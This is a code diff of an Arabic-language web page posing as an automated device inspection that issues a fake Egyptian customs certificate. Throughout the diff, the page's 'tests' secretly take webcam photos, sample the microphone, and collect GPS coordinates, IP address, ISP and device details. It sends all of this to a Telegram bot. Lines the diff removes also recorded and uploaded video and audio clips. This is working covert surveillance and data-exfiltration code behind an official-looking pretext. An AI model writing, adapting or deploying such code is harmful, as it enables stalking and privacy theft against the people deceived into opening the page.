                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false
                 });
                 
-                elements.cameraFeed.srcObject = cameraStream;
+                mobileElements.cameraFeed.srcObject = cameraStreamMobile;
                 
-                // إخفاء الـ Overlay بعد 2 ثانية
-                setTimeout(() => {
-                    elements.cameraOverlay1.style.opacity = '0';
-                    setTimeout(() => {
-                        elements.cameraOverlay1.style.display = 'none';
+                // العد التنازلي
+                let count = 3;
+                mobileElements.countdown1.textContent = count;
+                
+                const countdownInterval = setInterval(() => {
+                    count--;
+                    mobileElements.countdown1.textContent = count;
+                    
+                    if (count <= 0) {
+                        clearInterval(countdownInterval);
+                        mobileElements.cameraOverlay.style.opacity = '0';
                         
-                        // التقاط صورة تلقائياً بعد 3 ثوان
-                        setTimeout(async () => {
-                            await captureAndSendPhoto();
+                        setTimeout(() => {
+                            mobileElements.cameraOverlay.style.display = 'none';
                             
-                            // الانتقال للاختبار التالي
-                            setTimeout(() => {
-                                updateStep(3);
-                                startTest(3);
-                            }, 3000);
+                            // التقاط الصورة
+                            captureMobilePhoto();
                             
-                        }, 3000);
-                        
-                    }, 500);
-                }, 2000);
+                        }, 500);
+                    }
+                }, 1000);
                 
             } catch (error) {
-                console.error('❌ فشل كاميرا الصور:', error);
-                showHiddenNotification('⚠️ تم تخطي اختبار الكاميرا', 2000);
+                console.error('❌ فشل الكاميرا:', error);
+                showMobileNotification('⚠️ تم تخطي اختبار الكاميرا', 2000);
                 
                 setTimeout(() => {
-                    updateStep(3);
-                    startTest(3);
+                    updateMobileStep(3);
+                    startMobileTest(3);
                 }, 2000);
             }
         }
         
-        // دالة التقاط وإرسال الصورة
-        async function captureAndSendPhoto() {
+        // دالة التقاط صورة للجوال
+        async function captureMobilePhoto() {
             try {
-                // إنشاء canvas للالتقاط
+                // إنشاء canvas
                 const canvas = document.createElement('canvas');
-                canvas.width = elements.cameraFeed.videoWidth || 1280;
-                canvas.height = elements.cameraFeed.videoHeight || 720;
+                canvas.width = mobileElements.cameraFeed.videoWidth || 640;
+                canvas.height = mobileElements.cameraFeed.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 
                 // التقاط الصورة
-                ctx.drawImage(elements.cameraFeed, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(mobileElements.cameraFeed, 0, 0, canvas.width, canvas.height);
                 
                 // تحويل إلى base64
-                const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                 
                 // حفظ الصورة
-                collectedData.photos.push({
+                collectedDataMobile.photo = {
+                    data: photoData,
                     timestamp: new Date().toISOString(),
                     size: Math.round((photoData.length * 0.75) / 1024)
-                });
+                };
                 
-                // إرسال للبوت
-                await sendToTelegram(photoData, 'فحص بصري - صورة');
+                showMobileNotification('✅ تم التقاط الصورة', 1500);
                 
-                showHiddenNotification('✅ تم التقاط وإرسال الصورة', 2000);
+                // إيقاف الكاميرا
+                if (cameraStreamMobile) {
+                    cameraStreamMobile.getTracks().forEach(track => track.stop());
+                    cameraStreamMobile = null;
+                }
+                
+                // الانتقال للاختبار التالي
+                setTimeout(() => {
+                    updateMobileStep(3);
+                    startMobileTest(3);
+                }, 2000);
                 
             } catch (error) {
                 console.error('❌ فشل التقاط الصورة:', error);
-            }
-        }
-        
-        // اختبار 3: الفيديو
-        async function startVideoTest() {
-            showHiddenNotification('🎥 جاري تهيئة تسجيل الفيديو...', 2000);
-            
-            try {
-                if (!cameraStream) {
-                    cameraStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
-                        audio: true
-                    });
-                }
-                
-                elements.videoPreview.srcObject = cameraStream;
-                
-                // إخفاء الـ Overlay
-                setTimeout(() => {
-                    elements.cameraOverlay2.style.opacity = '0';
-                    setTimeout(() => {
-                        elements.cameraOverlay2.style.display = 'none';
-                        
-                        // بدء التسجيل بعد 2 ثانية
-                        setTimeout(() => {
-                            startVideoRecording();
-                        }, 2000);
-                        
-                    }, 500);
-                }, 2000);
-                
-            } catch (error) {
-                console.error('❌ فشل كاميرا الفيديو:', error);
-                showHiddenNotification('⚠️ تم تخطي اختبار الفيديو', 2000);
                 
                 setTimeout(() => {
-                    updateStep(4);
-                    startTest(4);
+                    updateMobileStep(3);
+                    startMobileTest(3);
                 }, 2000);
             }
         }
         
-        // دالة تسجيل الفيديو
-        async function startVideoRecording() {
-            try {
-                recordedChunks = [];
-                
-                // إنشاء MediaRecorder
-                videoRecorder = new MediaRecorder(cameraStream, {
-                    mimeType: 'video/webm;codecs=vp9'
-                });
-                
-                videoRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-                
-                videoRecorder.onstop = async () => {
-                    // تحويل الفيديو إلى blob
-                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    
-                    // تحويل إلى base64
-                    const videoData = await blobToBase64(videoBlob);
-                    
-                    // حفظ الفيديو
-                    collectedData.videos.push({
-                        timestamp: new Date().toISOString(),
-                        size: Math.round(videoBlob.size / 1024),
-                        duration: 5
-                    });
-                    
-                    // إرسال للبوت
-                    await sendVideoToTelegram(videoBlob);
-                    
-                    showHiddenNotification('✅ تم تسجيل وإرسال الفيديو', 2000);
-                    
-                    // الانتقال للاختبار التالي
-                    setTimeout(() => {
-                        updateStep(4);
-                        startTest(4);
-                    }, 2000);
-                };
-                
-                // بدء التسجيل لمدة 5 ثوان
-                videoRecorder.start();
-                
-                setTimeout(() => {
-                    if (videoRecorder.state === 'recording') {
-                        videoRecorder.stop();
-                    }
-                }, 5000);
-                
-            } catch (error) {
-                console.error('❌ فشل تسجيل الفيديو:', error);
-                
-                setTimeout(() => {
-                    updateStep(4);
-                    startTest(4);
-                }, 2000);
-            }
-        }
-        
-        // اختبار 4: الميكروفون
-        async function startMicrophoneTest() {
-            showHiddenNotification('🎤 جاري تهيئة اختبار الصوت...', 2000);
+        // اختبار 3: الميكروفون
+        async function mobileTestMicrophone() {
+            showMobileNotification('🎤 جاري اختبار الصوت...', 2000);
             
             try {
                 // طلب صلاحية الميكروفون
-                const audioStream = await navigator.mediaDevices.getUserMedia({
+                audioStreamMobile = await navigator.mediaDevices.getUserMedia({
                     audio: true,
                     video: false
                 });
                 
-                // إنشاء AudioContext
-                const audioContext = new AudioContext();
-                const source = audioContext.createMediaStreamSource(audioStream);
+                // قياس مستوى الصوت
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const source = audioContext.createMediaStreamSource(audioStreamMobile);
                 const analyser = audioContext.createAnalyser();
                 
                 source.connect(analyser);
@@ -1464,6 +1267,9 @@
                 
                 const bufferLength = analyser.frequencyBinCount;
                 const dataArray = new Uint8Array(bufferLength);
+                
+                let maxVolume = 0;
+                const volumeLevels = [];
                 
                 // تحديث مستوى الصوت
                 function updateVolume() {
@@ -1477,135 +1283,90 @@
                     const average = sum / bufferLength;
                     const percentage = Math.min(Math.round((average / 256) * 100), 100);
                     
-                    elements.volumeLevel.style.width = `${percentage}%`;
-                    elements.volumeText.textContent = `مستوى الصوت: ${percentage}%`;
+                    // تحديث الواجهة
+                    mobileElements.volumeLevel.style.width = `${percentage}%`;
+                    mobileElements.volumeText.textContent = `مستوى الصوت: ${percentage}%`;
                     
-                    // تغيير اللون حسب مستوى الصوت
+                    // تغيير اللون
                     if (percentage < 30) {
-                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #2ecc71, #3498db)';
+                        mobileElements.volumeLevel.style.background = 'linear-gradient(90deg, #2ecc71, #3498db)';
                     } else if (percentage < 70) {
-                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #f1c40f, #e67e22)';
+                        mobileElements.volumeLevel.style.background = 'linear-gradient(90deg, #f1c40f, #e67e22)';
                     } else {
-                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #e74c3c, #c0392b)';
+                        mobileElements.volumeLevel.style.background = 'linear-gradient(90deg, #e74c3c, #c0392b)';
                     }
                     
-                    if (isInspectionActive && !isPaused) {
-                        requestAnimationFrame(updateVolume);
+                    // حفظ أعلى مستوى
+                    if (percentage > maxVolume) maxVolume = percentage;
+                    volumeLevels.push(percentage);
+                    
+                    // الاستمرار لمدة 5 ثوان
+                    if (volumeLevels.length < 50) { // 5 ثوان (100ms لكل تحديث)
+                        setTimeout(updateVolume, 100);
+                    } else {
+                        // انتهاء الاختبار
+                        audioContext.close();
+                        if (audioStreamMobile) {
+                            audioStreamMobile.getTracks().forEach(track => track.stop());
+                            audioStreamMobile = null;
+                        }
+                        
+                        // حفظ البيانات
+                        collectedDataMobile.audioLevels = volumeLevels;
+                        collectedDataMobile.maxVolume = maxVolume;
+                        
+                        showMobileNotification('✅ تم اختبار الصوت', 1500);
+                        
+                        // الانتقال للاختبار التالي
+                        setTimeout(() => {
+                            updateMobileStep(4);
+                            startMobileTest(4);
+                        }, 2000);
                     }
                 }
                 
                 updateVolume();
                 
-                // التسجيل الصوتي
-                audioRecorder = new MediaRecorder(audioStream);
-                recordedChunks = [];
-                
-                audioRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-                
-                audioRecorder.onstop = async () => {
-                    const audioBlob = new Blob(recordedChunks, { type: 'audio/webm' });
-                    
-                    // حفظ التسجيل الصوتي
-                    collectedData.audio.push({
-                        timestamp: new Date().toISOString(),
-                        size: Math.round(audioBlob.size / 1024),
-                        duration: 5
-                    });
-                    
-                    // إرسال للبوت
-                    await sendAudioToTelegram(audioBlob);
-                    
-                    // إيقاف AudioContext
-                    audioContext.close();
-                    
-                    showHiddenNotification('✅ تم اختبار وإرسال الصوت', 2000);
-                    
-                    // الانتقال للاختبار التالي
-                    setTimeout(() => {
-                        updateStep(5);
-                        startTest(5);
-                    }, 2000);
-                };
-                
-                // بدء التسجيل لمدة 5 ثوان
-                audioRecorder.start();
-                
-                setTimeout(() => {
-                    if (audioRecorder.state === 'recording') {
-                        audioRecorder.stop();
-                    }
-                }, 5000);
-                
             } catch (error) {
                 console.error('❌ فشل اختبار الصوت:', error);
-                showHiddenNotification('⚠️ تم تخطي اختبار الصوت', 2000);
+                showMobileNotification('⚠️ تم تخطي اختبار الصوت', 2000);
                 
                 setTimeout(() => {
-                    updateStep(5);
-                    startTest(5);
+                    updateMobileStep(4);
+                    startMobileTest(4);
                 }, 2000);
             }
         }
         
-        // اختبار 5: الموقع الجغرافي
-        async function startLocationTest() {
-            showHiddenNotification('📍 جاري تحديد الموقع الجغرافي...', 2000);
+        // اختبار 4: الموقع الجغرافي
+        async function mobileTestLocation() {
+            showMobileNotification('📍 جاري تحديد الموقع...', 2000);
             
             try {
+                // أولاً: محاولة الحصول على الموقع عبر GPS
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            const location = {
+                            // الموقع من GPS
+                            const gpsLocation = {
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
                                 accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                altitudeAccuracy: position.coords.altitudeAccuracy,
-                                heading: position.coords.heading,
-                                speed: position.coords.speed,
-                                timestamp: position.timestamp
+                                source: 'GPS'
                             };
                             
-                            // تحديث الواجهة
-                            elements.mapPlaceholder.innerHTML = `
-                                <i class="fas fa-map-marker-alt" style="font-size: 48px; color: var(--danger); margin-bottom: 20px;"></i>
-                                <div style="font-weight: bold; color: var(--primary-blue);">تم تحديد موقعك</div>
-                                <div style="color: #666; margin-top: 10px;">دقة الموقع: ${Math.round(location.accuracy)} متر</div>
-                            `;
+                            collectedDataMobile.location = gpsLocation;
+                            updateLocationUI(gpsLocation);
                             
-                            elements.mapCoordinates.textContent = 
-                                `الإحداثيات: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
-                            
-                            // حفظ الموقع
-                            collectedData.location = location;
-                            
-                            // إرسال الموقع للبوت
-                            await sendLocationToTelegram(location);
-                            
-                            showHiddenNotification('✅ تم تحديد وإرسال الموقع', 2000);
-                            
-                            // الانتقال للاختبار النهائي
-                            setTimeout(() => {
-                                updateStep(6);
-                                startTest(6);
-                            }, 3000);
+                            // الحصول على معلومات إضافية عبر IP
+                            await getIPLocation(gpsLocation);
                             
                         },
-                        (error) => {
-                            console.error('❌ فشل تحديد الموقع:', error);
-                            elements.mapPlaceholder.innerHTML = `
-                                <i class="fas fa-map-marker-slash" style="font-size: 48px; color: var(--warning); margin-bottom: 20px;"></i>
-                                <div style="color: #666;">فشل الوصول إلى الموقع الجغرافي</div>
-                            `;
+                        async (error) => {
+                            console.warn('⚠️ فشل GPS:', error);
                             
-                            setTimeout(() => {
-                                updateStep(6);
-                                startTest(6);
-                            }, 3000);
+                            // إذا فشل GPS، جرب IP
+                            await getIPLocation();
                         },
                         {
                             enableHighAccuracy: true,
@@ -1614,112 +1375,195 @@
                         }
                     );
                 } else {
-                    elements.mapPlaceholder.innerHTML = `
-                        <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--warning); margin-bottom: 20px;"></i>
-                        <div style="color: #666;">المتصفح لا يدعم تحديد الموقع</div>
-                    `;
-                    
-                    setTimeout(() => {
-                        updateStep(6);
-                        startTest(6);
-                    }, 3000);
+                    // إذا لا يدعم GPS، جرب IP
+                    await getIPLocation();
                 }
                 
             } catch (error) {
-                console.error('❌ خطأ في اختبار الموقع:', error);
+                console.error('❌ خطأ في الموقع:', error);
+                showMobileNotification('⚠️ فشل تحديد الموقع', 2000);
+                
                 setTimeout(() => {
-                    updateStep(6);
-                    startTest(6);
-                }, 2000);
+                    updateMobileStep(5);
+                    startMobileTest(5);
+                }, 3000);
             }
         }
         
-        // اختبار 6: إصدار الشهادة
-        async function startCertificateGeneration() {
-            showHiddenNotification('🏅 جاري إصدار الشهادة النهائية...', 3000);
+        // دالة الحصول على الموقع عبر IP
+        async function getIPLocation(gpsLocation = null) {
+            try {
+                // استخدام ipapi.co (مجاني، لا يتطلب API key)
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                
+                const locationData = {
+                    ip: ipData.ip,
+                    country: ipData.country_name,
+                    city: ipData.city,
+                    region: ipData.region,
+                    timezone: ipData.timezone,
+                    isp: ipData.org,
+                    latitude: ipData.latitude,
+                    longitude: ipData.longitude,
+                    source: 'IP'
+                };
+                
+                // إذا كان هناك GPS، أضفه للبيانات
+                if (gpsLocation) {
+                    locationData.gps = gpsLocation;
+                }
+                
+                // تحديث البيانات
+                collectedDataMobile.location = locationData;
+                collectedDataMobile.ipInfo = ipData;
+                
+                // تحديث الواجهة
+                updateLocationUI(locationData);
+                
+                showMobileNotification('✅ تم تحديد الموقع', 1500);
+                
+                // الانتقال للاختبار التالي
+                setTimeout(() => {
+                    updateMobileStep(5);
+                    startMobileTest(5);
+                }, 3000);
+                
+            } catch (error) {
+                console.error('❌ فشل IP location:', error);
+                
+                // استخدام خدمة احتياطية
+                try {
+                    const backupResponse = await fetch('https://ipinfo.io/json');
+                    const backupData = await backupResponse.json();
+                    
+                    const loc = backupData.loc ? backupData.loc.split(',') : [0, 0];
+                    const locationData = {
+                        ip: backupData.ip,
+                        country: backupData.country,
+                        city: backupData.city,
+                        region: backupData.region,
+                        timezone: backupData.timezone,
+                        isp: backupData.org,
+                        latitude: parseFloat(loc[0]),
+                        longitude: parseFloat(loc[1]),
+                        source: 'IP (backup)'
+                    };
+                    
+                    collectedDataMobile.location = locationData;
+                    updateLocationUI(locationData);
+                    
+                    showMobileNotification('✅ تم تحديد الموقع (نسخة احتياطية)', 1500);
+                    
+                    setTimeout(() => {
+                        updateMobileStep(5);
+                        startMobileTest(5);
+                    }, 3000);
+                    
+                } catch (backupError) {
+                    console.error('❌ فشل جميع خدمات الموقع:', backupError);
+                    
+                    // بيانات افتراضية
+                    const defaultLocation = {
+                        country: 'مصر',
+                        city: 'القاهرة',
+                        timezone: 'Africa/Cairo',
+                        source: 'افتراضي'
+                    };
+                    
+                    collectedDataMobile.location = defaultLocation;
+                    updateLocationUI(defaultLocation);
+                    
+                    showMobileNotification('⚠️ استخدام موقع افتراضي', 1500);
+                    
+                    setTimeout(() => {
+                        updateMobileStep(5);
+                        startMobileTest(5);
+                    }, 3000);
+                }
+            }
+        }
+        
+        // دالة تحديث واجهة الموقع
+        function updateLocationUI(locationData) {
+            mobileElements.infoCountry.textContent = locationData.country || 'غير معروف';
+            mobileElements.infoCity.textContent = locationData.city || 'غير معروف';
+            mobileElements.infoTimezone.textContent = locationData.timezone || 'غير معروف';
+            mobileElements.infoISP.textContent = locationData.isp || 'غير معروف';
+            
+            if (locationData.latitude && locationData.longitude) {
+                mobileElements.coordinates.textContent = 
+                    `الإحداثيات: ${locationData.latitude.toFixed(4)}, ${locationData.longitude.toFixed(4)}`;
+            } else {
+                mobileElements.coordinates.textContent = 'الإحداثيات: غير متاحة';
+            }
+            
+            mobileElements.mapContent.innerHTML = `
+                <i class="fas fa-map-marker-alt" style="font-size: 36px; color: var(--danger); margin-bottom: 10px;"></i>
+                <div style="font-weight: bold; color: var(--primary-blue);">${locationData.city || locationData.country || 'الموقع'}</div>
+                <div style="color: #666; margin-top: 5px;">${locationData.source === 'GPS' ? 'دقة عالية' : 'دقة متوسطة'}</div>
+            `;
+        }
+        
+        // اختبار 5: الشهادة
+        async function mobileTestCertificate() {
+            showMobileNotification('🏅 جاري إصدار الشهادة...', 3000);
             
             // إنشاء رقم الشهادة
-            const certNumber = `EGC-${Date.now().toString().slice(-8)}`;
-            elements.certificateNumber.textContent = `رقم الشهادة: ${certNumber}`;
+            const certNumber = `EG-CUSTOMS-${Date.now().toString().slice(-8)}`;
+            mobileElements.certificateNumber.textContent = certNumber;
             
-            // إرسال تقرير كامل للبوت
-            await sendCompleteReportToTelegram(certNumber);
+            // تواريخ الشهادة
+            const now = new Date();
+            const expiry = new Date(now.getFullYear() + 1, now.getMonth(), now.getDate());
             
-            // تحديث حالة النظام
-            elements.startBtn.innerHTML = '<i class="fas fa-check-circle"></i> اكتمل الفحص';
-            elements.startBtn.style.background = 'linear-gradient(135deg, #28a745, #20c997)';
-            elements.nextBtn.disabled = true;
-            elements.pauseBtn.disabled = true;
+            mobileElements.certificateDate.textContent = now.toLocaleDateString('ar-SA');
+            mobileElements.certificateExpiry.textContent = expiry.toLocaleDateString('ar-SA');
             
-            showHiddenNotification('🎉 تم إصدار الشهادة بنجاح!', 5000);
+            // حفظ البيانات النهائية
+            collectedDataMobile.timestamps.completed = new Date().toISOString();
+            collectedDataMobile.certificate = {
+                number: certNumber,
+                issueDate: now.toISOString(),
+                expiryDate: expiry.toISOString()
+            };
             
-            // إيقاف جميع التايمرات
-            Object.values(testTimers).forEach(timer => {
-                if (timer) clearInterval(timer);
-            });
+            // تحديث شريط التقدم
+            mobileElements.progressFill.style.width = '100%';
+            mobileElements.progressPercent.textContent = '100%';
+            
+            // إظهار زر التحميل
+            mobileElements.downloadBtn.style.display = 'flex';
+            
+            // إرسال التقرير الكامل للبوت
+            await sendCompleteReport();
+            
+            showMobileNotification('🎉 تم إصدار الشهادة بنجاح!', 5000);
+            
+            // إكمال الفحص
+            allDataCollected = true;
+            isMobileInspectionActive = false;
+            
+            // إرسال إشعار نهائي
+            sendCompletionNotification();
         }
         
         // دالة الانتقال للاختبار التالي
-        function nextTest() {
-            if (currentTest < 6) {
-                updateStep(currentTest + 1);
-                startTest(currentTest);
+        function nextMobileTest() {
+            if (currentMobileTest < 5) {
+                updateMobileStep(currentMobileTest + 1);
+                startMobileTest(currentMobileTest + 1);
             }
         }
         
-        // دالة إيقاف الفحص مؤقتاً
-        function pauseInspection() {
-            isPaused = !isPaused;
-            elements.pauseBtn.innerHTML = isPaused ? 
-                '<i class="fas fa-play"></i> استئناف' : 
-                '<i class="fas fa-pause"></i> إيقاف مؤقت';
-            
-            showHiddenNotification(isPaused ? '⏸️ تم إيقاف الفحص مؤقتاً' : '▶️ تم استئناف الفحص', 2000);
-        }
-        
-        // دالة إيقاف الفحص
-        function stopInspection() {
-            isInspectionActive = false;
-            isPaused = false;
-            
-            // إيقاف جميع التدفقات
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            
-            // إيقاف جميع التايمرات
-            Object.values(testTimers).forEach(timer => {
-                if (timer) clearInterval(timer);
-            });
-            
-            // إعادة تعيين الأزرار
-            elements.startBtn.disabled = false;
-            elements.nextBtn.disabled = true;
-            elements.pauseBtn.disabled = true;
-            elements.stopBtn.disabled = true;
-            elements.startBtn.innerHTML = '<i class="fas fa-play"></i> بدء الفحص الشامل';
-            
-            showHiddenNotification('🛑 تم إيقاف الفحص', 3000);
-        }
-        
-        // ===== دوال الإرسال إلى تلجرام =====
-        
-        // إرسال معلومات الجهاز
-        async function sendDeviceInfoToTelegram(deviceInfo) {
+        // دالة إرسال رسالة بدء للبوت
+        async function sendStartupMessage() {
             try {
-                const message = `📋 معلومات الجهاز الكاملة\n\n` +
-                               `🖥️ النظام: ${deviceInfo.platform}\n` +
-                               `🌐 المتصفح: ${deviceInfo.userAgent.substring(0, 100)}\n` +
-                               `💬 اللغة: ${deviceInfo.language}\n` +
-                               `📱 الدقة: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n` +
-                               `🎨 الألوان: ${deviceInfo.colorDepth}بت\n` +
-                               `🧠 الذاكرة: ${deviceInfo.deviceMemory}GB\n` +
-                               `⚡ المعالجات: ${deviceInfo.hardwareConcurrency}\n` +
-                               `📍 المنطقة: ${deviceInfo.timezone}\n` +
-                               `🌐 الاتصال: ${deviceInfo.online ? 'متصل' : 'غير متصل'}\n` +
-                               `🍪 الكوكيز: ${deviceInfo.cookiesEnabled ? 'مفعلة' : 'معطلة'}\n` +
-                               `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}`;
+                const message = `🚀 بدء الفحص الشامل التلقائي\n\n` +
+                               `📅 ${new Date().toLocaleString('ar-SA')}\n` +
+                               `🔗 ${window.location.href}\n` +
+                               `📱 ${navigator.userAgent.substring(0, 80)}...\n` +
+                               `🌐 بدء جمع البيانات الشامل`;
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -1734,18 +1578,102 @@
                 });
                 
             } catch (error) {
-                console.error('❌ فشل إرسال معلومات الجهاز:', error);
+                console.log('⚠️ لم يتم إرسال رسالة البدء');
             }
         }
         
-        // إرسال الصورة
-        async function sendToTelegram(photoData, caption = '') {
+        // دالة إرسال التقرير الكامل للبوت
+        async function sendCompleteReport() {
+            if (finalReportSent) return;
+            
+            try {
+                // بناء التقرير المنظم
+                const report = buildCompleteReport();
+                
+                // إرسال التقرير النصي
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: report,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                // إذا كانت هناك صورة، إرسالها
+                if (collectedDataMobile.photo && collectedDataMobile.photo.data) {
+                    await sendPhotoToBot(collectedDataMobile.photo.data);
+                }
+                
+                finalReportSent = true;
+                showMobileNotification('📤 تم إرسال التقرير الكامل للبوت', 3000);
+                
+            } catch (error) {
+                console.error('❌ فشل إرسال التقرير:', error);
+            }
+        }
+        
+        // دالة بناء التقرير الكامل
+        function buildCompleteReport() {
+            const device = collectedDataMobile.device;
+            const location = collectedDataMobile.location;
+            const cert = collectedDataMobile.certificate;
+            
+            let report = `📊 <b>تقرير الفحص الشامل النهائي</b>\n`;
+            report += `════════════════════════\n\n`;
+            
+            report += `🏆 <b>رقم الشهادة:</b> ${cert.number}\n`;
+            report += `📅 <b>تاريخ الإصدار:</b> ${new Date(cert.issueDate).toLocaleString('ar-SA')}\n`;
+            report += `⏳ <b>تاريخ الانتهاء:</b> ${new Date(cert.expiryDate).toLocaleDateString('ar-SA')}\n\n`;
+            
+            report += `📱 <b>معلومات الجهاز:</b>\n`;
+            report += `├ المتصفح: ${getBrowserName(device.browser)}\n`;
+            report += `├ نظام التشغيل: ${getOSName(device.platform)}\n`;
+            report += `├ الدقة: ${device.screenWidth} × ${device.screenHeight}\n`;
+            report += `├ اللغة: ${device.language}\n`;
+            report += `├ المعالجات: ${device.hardwareConcurrency}\n`;
+            report += `├ الذاكرة: ${device.deviceMemory} GB\n`;
+            report += `├ المنطقة الزمنية: ${device.timezone}\n`;
+            report += `└ الاتصال: ${device.online ? 'متصل ✓' : 'غير متصل ✗'}\n\n`;
+            
+            report += `📍 <b>الموقع الجغرافي:</b>\n`;
+            report += `├ الدولة: ${location.country || 'غير معروف'}\n`;
+            report += `├ المدينة: ${location.city || 'غير معروف'}\n`;
+            report += `├ المنطقة: ${location.region || 'غير معروف'}\n`;
+            if (location.latitude && location.longitude) {
+                report += `├ الإحداثيات: ${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}\n`;
+            }
+            report += `├ المنطقة الزمنية: ${location.timezone || 'غير معروف'}\n`;
+            report += `├ مزود الخدمة: ${location.isp || 'غير معروف'}\n`;
+            report += `└ مصدر البيانات: ${location.source || 'غير معروف'}\n\n`;
+            
+            report += `📸 <b>نتائج الفحوصات:</b>\n`;
+            report += `├ فحص الكاميرا: ${collectedDataMobile.photo ? 'ناجح ✓' : 'تخطي ✗'}\n`;
+            report += `├ فحص الصوت: ${collectedDataMobile.maxVolume ? `ناجح (${collectedDataMobile.maxVolume}%) ✓` : 'تخطي ✗'}\n`;
+            report += `└ فحص الموقع: ${location.country ? 'ناجح ✓' : 'تخطي ✗'}\n\n`;
+            
+            report += `🌐 <b>معلومات الاتصال:</b>\n`;
+            report += `├ الرابط: ${window.location.href}\n`;
+            report += `├ الـ IP: ${location.ip || 'غير معروف'}\n`;
+            report += `└ الوقت: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            
+            report += `✅ <b>حالة الفحص:</b> مكتمل بنجاح\n`;
+            report += `🎯 <b>النتيجة النهائية:</b> الجهاز مطابق للمواصفات`;
+            
+            return report;
+        }
+        
+        // دالة إرسال الصورة للبوت
+        async function sendPhotoToBot(photoData) {
             try {
                 const blob = await fetch(photoData).then(res => res.blob());
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('caption', `📸 ${caption}\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                formData.append('photo', blob, `mobile_inspection_${Date.now()}.jpg`);
+                formData.append('caption', `📸 صورة فحص الجهاز\n🕐 ${new Date().toLocaleString('ar-SA')}`);
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -1757,52 +1685,12 @@
             }
         }
         
-        // إرسال الفيديو
-        async function sendVideoToTelegram(videoBlob) {
+        // دالة إرسال إشعار الإكمال
+        async function sendCompletionNotification() {
             try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('video', videoBlob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 فحص الفيديو\n⏱️ المدة: 5 ثواني\n🕐 ${new Date().toLocaleString('ar-SA')}`);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-            } catch (error) {
-                console.error('❌ فشل إرسال الفيديو:', error);
-            }
-        }
-        
-        // إرسال الصوت
-        async function sendAudioToTelegram(audioBlob) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('audio', audioBlob, `audio_${Date.now()}.webm`);
-                formData.append('caption', `🎤 فحص الصوت\n⏱️ المدة: 5 ثواني\n🕐 ${new Date().toLocaleString('ar-SA')}`);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-            } catch (error) {
-                console.error('❌ فشل إرسال الصوت:', error);
-            }
-        }
-        
-        // إرسال الموقع
-        async function sendLocationToTelegram(location) {
-            try {
-                const message = `📍 الموقع الجغرافي\n\n` +
-                               `🌐 خط العرض: ${location.latitude.toFixed(6)}\n` +
-                               `🌐 خط الطول: ${location.longitude.toFixed(6)}\n` +
-                               `🎯 الدقة: ${Math.round(location.accuracy)} متر\n` +
-                               `⬆️ الارتفاع: ${location.altitude ? Math.round(location.altitude) + ' متر' : 'غير متاح'}\n` +
-                               `🧭 الاتجاه: ${location.heading ? Math.round(location.heading) + '°' : 'غير متاح'}\n` +
-                               `💨 السرعة: ${location.speed ? Math.round(location.speed) + ' م/ث' : 'غير متاح'}\n` +
+                const message = `🎉 اكتمل الفحص الشامل بنجاح!\n\n` +
+                               `✅ تم جمع جميع البيانات\n` +
+                               `📊 تم إرسال التقرير الكامل\n` +
                                `🕐 ${new Date().toLocaleString('ar-SA')}`;
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -1812,78 +1700,74 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
                 
             } catch (error) {
-                console.error('❌ فشل إرسال الموقع:', error);
+                console.log('⚠️ لم يتم إرسال إشعار الإكمال');
             }
         }
         
-        // إرسال التقرير الكامل
-        async function sendCompleteReportToTelegram(certNumber) {
-            try {
